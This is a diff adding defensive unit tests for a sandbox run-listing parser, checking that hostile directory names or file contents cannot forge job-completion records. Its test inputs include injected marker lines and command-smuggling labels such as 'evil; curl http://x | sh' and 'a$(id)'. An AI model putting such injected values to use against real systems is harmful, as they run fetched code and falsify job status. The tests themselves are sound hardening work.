@@ -208,3 +208,194 @@ class RecScriptContractTest(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class ListingFramingTest(unittest.TestCase):
+    """The listing wire format must be unforgeable by the sandbox.
+
+    A .runs/ directory can be created by anything with write access to the
+    workdir, and it supplies its own name, meta.json, exit_code and
+    finished_at. If any of those reach the stream raw, one of them can carry a
+    newline plus a `===MERV_RUN ` line and synthesize a block for a DIFFERENT
+    label — and because _record fills any row whose exit_code is still NULL,
+    that forges a completion for a job that is still running.
+    """
+
+    @staticmethod
+    def _b64(text: str) -> str:
+        import base64
+
+        return base64.b64encode(text.encode("utf-8")).decode("ascii")
+
+    def _emit(self, label: str, *, meta: str = "{}", exit_code: str = "", fin: str = "") -> str:
+        return (
+            f"===MERV_RUN {self._b64(label)}\n"
+            f"===META {self._b64(meta)}\n"
+            f"===EXIT {self._b64(exit_code)}\n"
+            f"===FIN {self._b64(fin)}\n"
+        )
+
+    def test_newline_in_directory_name_cannot_forge_a_block(self) -> None:
+        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing
+
+        # An ACTUAL newline — legal in a Linux directory name.
+        hostile = 'evil\n===MERV_RUN seed0\n===EXIT 0\n'
+        stream = (
+            self._emit("seed0", meta='{"command":"REAL"}')
+            + self._emit(hostile, exit_code="0")
+        )
+        parsed = parse_runs_listing(stream)
+        self.assertEqual([r["label"] for r in parsed], ["seed0"])
+        self.assertEqual(parsed[0]["command"], "REAL")
+        self.assertIsNone(parsed[0]["exit_code"])
+
+    def test_marker_inside_meta_json_cannot_forge_a_block(self) -> None:
+        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing
+
+        stream = (
+            self._emit("seed0", meta='{"command":"REAL"}')
+            + self._emit("evil", meta='===MERV_RUN c2VlZDA=\n===EXIT MA==\n')
+        )
+        parsed = parse_runs_listing(stream)
+        self.assertEqual([r["label"] for r in parsed], ["seed0", "evil"])
+        self.assertIsNone(parsed[0]["exit_code"])
+
+    def test_marker_inside_exit_code_file_cannot_forge_a_block(self) -> None:
+        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing
+
+        stream = (
+            self._emit("seed0", meta='{"command":"REAL"}')
+            + self._emit("evil", exit_code='0\n===MERV_RUN c2VlZDA=\n===EXIT MA==\n')
+        )
+        parsed = parse_runs_listing(stream)
+        self.assertEqual([r["label"] for r in parsed], ["seed0", "evil"])
+        self.assertIsNone(parsed[0]["exit_code"])
+
+    def test_shell_metacharacter_labels_are_dropped(self) -> None:
+        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing
+
+        for hostile in ("evil; curl http://x | sh", "a`id`", "a$(id)", "a b", " seed0 "):
+            with self.subTest(label=hostile):
+                self.assertEqual(parse_runs_listing(self._emit(hostile)), [])
+
+    def test_legitimate_labels_round_trip(self) -> None:
+        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing
+
+        for good in ("seed0", "qpf_rest", "tier-1.2", "A_b-c.9"):
+            with self.subTest(label=good):
+                parsed = parse_runs_listing(
+                    self._emit(good, meta='{"command":"c","pid":7,"started_at":"t"}',
+                               exit_code="3", fin="2026-01-01T00:00:00Z")
+                )
+                self.assertEqual(len(parsed), 1)
+                self.assertEqual(parsed[0]["label"], good)
+                self.assertEqual(parsed[0]["exit_code"], 3)
+                self.assertEqual(parsed[0]["pid"], 7)
+
+    def test_the_emitted_shell_command_base64s_every_field(self) -> None:
+        from merv.brain.sandbox.execution.run_receipts import runs_listing_command
+
+        cmd = runs_listing_command(experiment_dir="/workspace/exp")
+        for field in ("meta.json", "exit_code", "finished_at"):
+            with self.subTest(field=field):
+                segment = cmd.split(field, 1)[1].split(";", 1)[0]
+                self.assertIn("base64", segment)
+        # The label uses shell parameter expansion, not basename: basename
+        # appends a newline and $() strips trailing ones, which would normalize
+        # a hostile "seed0\n" directory onto the real seed0 row.
+        self.assertNotIn("basename", cmd)
+        self.assertIn("b=${r%/}; b=${b##*/}", cmd)
+
+    def test_dot_prefixed_labels_are_observed(self) -> None:
+        """merv_run accepts a leading dot, so the observer must see it.
+
+        The launcher's charset permits `.hidden`, and it happily creates
+        .runs/.hidden/ — but a bare `*/` glob never matches a dot-name, so the
+        run existed and was invisible: no receipt, no exit code, no event.
+        """
+        import os
+        import shutil
+        import subprocess
+        import tempfile
+
+        from merv.brain.sandbox.execution.run_receipts import (
+            parse_runs_listing,
+            runs_listing_command,
+        )
+
+        root = tempfile.mkdtemp()
+        try:
+            runs = os.path.join(root, ".runs")
+            for name in (".hidden", "plain", "..odd"):
+                os.makedirs(os.path.join(runs, name))
+                with open(os.path.join(runs, name, "exit_code"), "w") as handle:
+                    handle.write("0\n")
+            out = subprocess.run(
+                ["sh", "-c", runs_listing_command(experiment_dir=root)],
+                capture_output=True, text=True, timeout=10,
+            )
+            self.assertEqual(out.returncode, 0, out.stderr)
+            seen = {r["label"] for r in parse_runs_listing(out.stdout)}
+            self.assertEqual(seen, {".hidden", "plain", "..odd"})
+        finally:
+            shutil.rmtree(root, ignore_errors=True)
+
+    def test_a_long_command_survives_the_meta_cap(self) -> None:
+        """A truncated meta.json is invalid JSON and loses command/pid/started_at."""
+        import json
+        import os
+        import shutil
+        import subprocess
+        import tempfile
+
+        from merv.brain.sandbox.execution.run_receipts import (
+            parse_runs_listing,
+            runs_listing_command,
+        )
+
+        root = tempfile.mkdtemp()
+        try:
+            run_dir = os.path.join(root, ".runs", "seed0")
+            os.makedirs(run_dir)
+            long_cmd = "python train.py " + " ".join(
+                f"--flag{i}=value{i}" for i in range(1200)
+            )
+            self.assertGreater(len(long_cmd), 8192)  # would have truncated before
+            with open(os.path.join(run_dir, "meta.json"), "w") as handle:
+                json.dump(
+                    {"label": "seed0", "command": long_cmd, "pid": 42,
+                     "started_at": "2026-07-05T10:00:00Z"}, handle,
+                )
+            out = subprocess.run(
+                ["sh", "-c", runs_listing_command(experiment_dir=root)],
+                capture_output=True, text=True, timeout=10,
+            )
+            parsed = parse_runs_listing(out.stdout)
+            self.assertEqual(len(parsed), 1)
+            self.assertEqual(parsed[0]["command"], long_cmd)
+            self.assertEqual(parsed[0]["pid"], 42)
+        finally:
+            shutil.rmtree(root, ignore_errors=True)
+
+    def test_invalid_utf8_in_meta_degrades_rather_than_losing_the_record(self) -> None:
+        """A byte-based cut can split a multibyte character on the box.
+
+        The parser decodes with errors="replace", so the receipt survives with
+        one replacement character instead of the whole record being dropped.
+        Pinned so that resilience is not refactored away.
+        """
+        import base64
+
+        from merv.brain.sandbox.execution.run_receipts import parse_runs_listing
+
+        split = b'{"label":"seed0","command":"caf\xc3","pid":7,"started_at":"t"}'
+        stream = (
+            "===MERV_RUN " + base64.b64encode(b"seed0").decode() + "\n"
+            "===META " + base64.b64encode(split).decode() + "\n"
+            "===EXIT " + base64.b64encode(b"0").decode() + "\n"
+            "===FIN " + base64.b64encode(b"t").decode() + "\n"
+        )
+        parsed = parse_runs_listing(stream)
+        self.assertEqual(len(parsed), 1)
+        self.assertEqual(parsed[0]["pid"], 7)
+        self.assertEqual(parsed[0]["exit_code"], 0)
